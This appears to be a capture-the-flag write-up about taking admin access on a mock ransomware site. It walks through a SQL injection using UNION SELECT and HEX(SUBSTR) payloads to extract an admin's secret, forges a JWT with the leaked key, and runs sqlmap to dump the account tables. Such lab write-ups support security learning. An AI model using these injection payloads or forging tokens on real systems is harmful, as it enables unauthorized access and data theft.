With access to the site, you can access most of the functionality. But there's still that admin area that's locked off.

Generate a new token value which will allow you to access the ransomware site _as an administrator_.

Prompt:
-   Enter a token value which will allow you to login as an administrator.

---

First let's poke around the site and see what we can find for clues.

Page | Value
----------|------------
/ | ![](/T7/Files/Pasted%20image%2020221108152226.png)
adminlist | ![](/T7/Files/Pasted%20image%2020221108152149.png)
userinfo | ![](/T7/Files/Pasted%20image%2020221108152304.png)
forum | ![](/T7/Files/Pasted%20image%2020221108152333.png)
lock | ![](/T7/Files/Pasted%20image%2020221108152405.png)
unlock | ![](/T7/Files/Pasted%20image%2020221108152425.png)
admin | ![](/T7/Files/Pasted%20image%2020221108152455.png)
fetchlog | ![](/T7/Files/Pasted%20image%2020221108152519.png)
credit | ![](/T7/Files/Pasted%20image%2020221108152538.png)

The three ADMIN ONLY pages are protected it seems.  Looking at server.py, we see that there is a check being performed before the page is returned:

```python
	elif path == 'admin':
		return util.check_admin(admin)
	elif path == 'fetchlog':
		return util.check_admin(fetchlog)
	elif path == 'credit':
		return util.check_admin(credit)
```
Looking up that function in the util.py file we find:
```python
def check_admin(f):
	""" Call f only if user is an admin """
	if not is_admin():
		return render_template("admininvalid.html")
	return f()
```
So the check is in the is_admin() function:
```python
def is_admin():
	""" Is the logged-in user an admin? """	
	uid = get_uid()
	with userdb() as con:
		query = "SELECT isAdmin FROM Accounts WHERE uid = ?"
		row = con.execute(query, (uid,)).fetchone()
		if row is None:
			return False
		return row[0] == 1 
```

It appears that the UID is queried from the database to find out if they are an admin.  So just updating the UID should be enough to trigger admin rights.  However, we need to find out what an admin UID value would be.

Digging deeper into the get_uid() function, we see there is an additional validation with validate_token()

```python
def get_uid():
	""" Gets the logged-in user's uid from their token, if it is valid """
	token = request.cookies.get('tok')
	if token == None:
		print("No token cookie found!", file=sys.stderr)
		raise MissingTokenException
	if not validate_token(token):
		raise InvalidTokenException
	return jwt.decode(token, hmac_key(), algorithms=['HS256'])['uid']
```

```python
def validate_token(token):
	try:	
		claims = jwt.decode(token, hmac_key(), algorithms=['HS256'])
	except:
		# Either invalid format, expired, or wrong key
		return False
	with userdb() as con:
		row = con.execute('SELECT secret FROM Accounts WHERE uid = ?', (claims['uid'],)).fetchone()
		if row is None:
			return False
		return row[0] == claims['sec']
```
We see that the SEC value from the token must match the UID from the database.  This would prove to be quite difficult.  Even if we tried brute-forcing.

We are able to extrapolate some information from the Admin List page though.  We can see the name of "Logged In" admin called ProfuseHunter

After digging through the server side code more thoroughly, we can find that the userinfo page is vulnerable to a SQL injection:

```python
def userinfo():
	""" Create a page that displays information about a user """			
	query = request.values.get('user')
	if query == None:
		query =  util.get_username()	
	userName = memberSince = clientsHelped = hackersHelped = contributed = ''
	with util.userdb() as con:	
		infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query
		row = con.execute(infoquery).fetchone()	
		if row != None:
			userName = query
			memberSince = int(row[0])
			clientsHelped = int(row[1])
			hackersHelped = int(row[2])
			contributed = int(row[3])
	if memberSince != '':
		memberSince = datetime.utcfromtimestamp(int(memberSince)).strftime('%Y-%m-%d')
	resp = make_response(render_template('userinfo.html', 
		userName=userName,
		memberSince=memberSince, 
		clientsHelped=clientsHelped,
		hackersHelped=hackersHelped, 
		contributed=contributed,
		pathkey=expected_pathkey()))
	return resp
```
When this page is rendered, if no user parameter is specified, it uses the get_username() function which calls on the get_uid() and validation functions.  But... if a user IS specified in the request parameters, the validation is bypassed.  We can test this by providing the known admin username as a parameter:

https://ukzcouspczgmbzmx.ransommethis.net/etvdmxhpgpvdweyg/userinfo?user=ProfuseHunter

![](/T7/Files/Pasted%20image%2020221108222145.png)

Based on the query that is being performed, we can try a couple different things to try and grab extra data.  We are somewhat limited though as the result of the query will cast everything to an INT so things like strings are a no-go with textbook injections.

```sql
SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'
```

Based on some of the other queries that are made in server.py and util.py we can ascertain some of the tables and columns that are in use.  Namely in the validateToken() function, we see that UID is a column inside the Accounts table:

```sql
SELECT secret FROM Accounts WHERE uid = ?
```

Accounts must contain SECRET, UID, USERNAME based on those last two queriers at a minimum.  Next we need to figure out how to trick the server into letting us query for information.

1. We assumed that we need to have a valid UID of an admin
2. We saw 'ProfuseHunter' was listed as an admin on the /adminlist page
3. We have a query that needs to have INT values returned to it

If we escape the query with a single quote ( ' ), we can start appending data to the query.  It took quite a few attempts to find something that would work so I will focus only on the method that did work:  UNION SELECT injection with an AND clause.

If we setup the parameter like so:
' AND 0 UNION SELECT 1,2,3,4--

The resulting query looks like this:

```sql
SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='' AND 0 UNION SELECT 1,2,3,4--
```

The AND 0 clause effectively nullifies any data from the initial SELECT/INNER JOIN query.  The -- at the end comments out the remainder of the query.

So the initial query looked like so:
https://ukzcouspczgmbzmx.ransommethis.net/etvdmxhpgpvdweyg/userinfo?user='AND 0--

![](/T7/Files/Pasted%20image%2020221117205745.png)

However, by doing a UNION SELECT we can replace that data with the values 1,2,3,4 and test to see if those values are reflected back into the website

The new query would appear as so:
https://ukzcouspczgmbzmx.ransommethis.net/etvdmxhpgpvdweyg/userinfo?user='AND 0 UNION SELECT 1,2,3,4--

![](/T7/Files/Pasted%20image%2020221117210253.png)

This worked!  Now lets try to target the UID of the one known admind that we have.  Instead of using 4, lets replace this with a query into the accounts table:

```sql
SELECT 1,2,3,uid FROM Accounts WHERE userName = 'ProfuseHunter'--
```
This changes the entire query to look like so:

https://ukzcouspczgmbzmx.ransommethis.net/etvdmxhpgpvdweyg/userinfo?user='AND 0 UNION SELECT 1,2,3,uid FROM Accounts WHERE userName = 'ProfuseHunter'--

![](/T7/Files/Pasted%20image%2020221117210650.png)

BINGO!  We got a UID for ProfuseHunter!

Yet we are still missing one vital part of the equation.  The SEC value in the Token is used to check the saved password hash in the database as well!

This took some messing around.  We know based on the ValidateFunction paramter that there is a 'secret' column.  We need that value in addition to the UID to generate the new JWT token for the cookie.

I'll spare you the immesurable amount of time I spent trying different queries and syntax and jump to the answer.

In short, we still need to return a value that can be cast to INT.  The hash is going to consist of ASCII characters so we need to find a way to convert those.  After messing around, I found that using HEX() was possible as python can convert hex to int values!

The initial test query looked like:
```sql
'AND 0 UNION SELECT 1,2,3,HEX('A')--
```

![](/T7/Files/Pasted%20image%2020221117213000.png)

This works -- While python isn't converting it from HEX to INT, the hex value of 0x41 is in fact 'A'.  Now we need to use this to select one character at a time from the SECRET column for the user and keep a list of all the values that are returned.

Our new query now looks like this:
```sql
'AND 0 UNION SELECT 1,2,3,HEX(SUBSTR(secret,1,1)) FROM Accounts WHERE userName = 'ProfuseHunter'--
```

![](/T7/Files/Pasted%20image%2020221117213317.png)

Lo-and-behold!  The first character of the secret for ProfuseHunter! ...now to repeat this process until we get an error - Increasing the SUBSTR params from 1,1 > 2,2 > 3,3 etc... until nothing returns or we get an error.

This definitely took a while... but thankfully it was only 32 characters long.  Our list of hex values appear to be as such:
```
34 36 69 75 50 43 74 75 4a 6a 6d 73 4a 47 57 52 79 46 57 6e 61 72 50 46 6a 57 36 59 6c 61 77 79
```
And if we convert these values from Hex to ASCII, we end up with:
```
46iuPCtuJjmsJGWRyFWnarPFjW6Ylawy
```
Now we finally have our SEC and UID values to generate a new Token!  Let's head over to https://jwt.io/ and plug in the new values:

```json
{
  "typ": "JWT",
  "alg": "HS256"
}

{
  "iat": 1667260800,
  "exp": 1669852800,
  "sec": "46iuPCtuJjmsJGWRyFWnarPFjW6Ylawy",
  "uid": 12344
}

{
  "hmac":"BCUr5gSMv88JvPqFcbakMK3iSJSiV7LS"
}
```
```
Result:
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjcyNjA4MDAsImV4cCI6MTY2OTg1MjgwMCwic2VjIjoiNDZpdVBDdHVKam1zSkdXUnlGV25hclBGalc2WWxhd3kiLCJ1aWQiOjEyMzQ0fQ.K9Iv_OWu3ZnY4FNZNcjUi6czUP4AUHKW_xdmczI4g2U"
```

If we plug this new token into our cookie 'tok' value and browse to the admin page...  ACCESS GRANTED!

![](/T7/Files/Pasted%20image%2020221109142155.png)

```
Answer: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjcyNjA4MDAsImV4cCI6MTY2OTg1MjgwMCwic2VjIjoiNDZpdVBDdHVKam1zSkdXUnlGV25hclBGalc2WWxhd3kiLCJ1aWQiOjEyMzQ0fQ.K9Iv_OWu3ZnY4FNZNcjUi6czUP4AUHKW_xdmczI4g2U
```

![](/T7/Files/badge7.png)


#### *Fun Side Testing...*

Since the site was vulnerable to SQL Injection Attacks, I used sqlmap to try and glean as much additional information as possible from the database...

```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -u https://ukzcouspczgmbzmx.ransommethis.net/etvdmxhpgpvdweyg/userinfo?user=ProfuseHunter 
--cookie="tok=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjcyNjA4MDAsImV4cCI6MTY2OTg1MjgwMCwic2VjIjoiYWxqMURCWEFlSU1qaXVockt0Ylg4UUFvUU9HTHk2dnkiLCJ1aWQiOjM3MDM3fQ.451NeZuWAH_AjcBMCms0kKJXBBR_NMH-KUXBkyUMAok"
-a --dbms=sqlite --level=5 --risk=3
```

While this was successfull, it took a very long time -- 7 Hours!  Based on the results that were output, it was also possible to do a Time-Based Blind Injection attack for each character in the column/row in the database where the length of the delay determined the letter that was in the data.

Everything was able to be enumerated with exception of the hashed password.
NOTE: I trimmed pwsalt & secret to keep the columns from carrying to a new line

Fun Fact: Doing this does not provide any additional information that will help us as the databases will soon become available to us anyways now that we have admin access...

```
Table: Accounts
+-------+---------+-----------+-----------+---------+-----------------------+
| uid   | pwhash  | pwsalt    | secret    | isAdmin | userName              |
+-------+---------+-----------+-----------+---------+-----------------------+
| 37037 | <blank> | hhhtok... | alj1DB... | 0       | WiseGeneration        |
| 12344 | <blank> | DooQDH... | 46iuPC... | 1       | ProfuseHunter         |
| 41247 | <blank> | GjuhI7... | OQVsJM... | 0       | EfficientSorghum      |
| 39851 | <blank> | ZEF7fL... | EilyV2... | 0       | GrievingRestroom      |
| 13564 | <blank> | hOBUi_... | ZkhlFb... | 0       | NappyPartnership      |
| 24355 | <blank> | wOV3rX... | e4DhwM... | 0       | GoofyLeisure          |
| 19927 | <blank> | bXBtcm... | aRPW7c... | 0       | DomineeringStool      |
| 20352 | <blank> | zKkuqt... | z4Xlrp... | 0       | SuperLogistics        |
| 14939 | <blank> | A0ft16... | vm8yOp... | 0       | SlowGallery           |
| 48583 | <blank> | 3yzGYq... | Y5f9yv... | 0       | BrawnyDimple          |
| 19298 | <blank> | mlZxEd... | fFJoaL... | 0       | LopsidedGoodness      |
| 44390 | <blank> | 2J6w2f... | dpTDAw... | 0       | SoftPopcorn           |
| 13835 | <blank> | ZFE01V... | WuW7bs... | 0       | KindheartedSabre      |
| 26678 | <blank> | k_fyCR... | 2NLwfQ... | 0       | SpectacularOccupation |
| 38642 | <blank> | m3GvTK... | lH60TE... | 0       | DisillusionedMailer   |
+-------+---------+-----------+-----------+---------+-----------------------+

Table: UserInfo
+-------+-------------+---------------+---------------+---------------------+
| uid   | memberSince | clientsHelped | hackersHelped | programsContributed |
+-------+-------------+---------------+---------------+---------------------+
| 37037 | 1581367604  | 7             | 1             | 19                  |
| 12344 | 1606682805  | 14            | 17            | 24                  |
| 41247 | 1592426805  | 7             | 30            | 9                   |
| 39851 | 1607114805  | 9             | 4             | 11                  |
| 13564 | 1630356405  | 10            | 16            | 12                  |
| 24355 | 1590007605  | 24            | 11            | 9                   |
| 19927 | 1619124405  | 2             | 20            | 24                  |
| 20352 | 1607114805  | 29            | 24            | 7                   |
| 14939 | 1641070005  | 15            | 17            | 15                  |
| 48583 | 1598129205  | 21            | 29            | 1                   |
| 19298 | 1624308405  | 26            | 15            | 20                  |
| 44390 | 1636836405  | 2             | 15            | 20                  |
| 13835 | 1621111605  | 18            | 22            | 2                   |
| 26678 | 1608324405  | 8             | 8             | 2                   |
| 38642 | 1575319605  | 28            | 19            | 22                  |
+-------+-------------+---------------+---------------+---------------------+
```
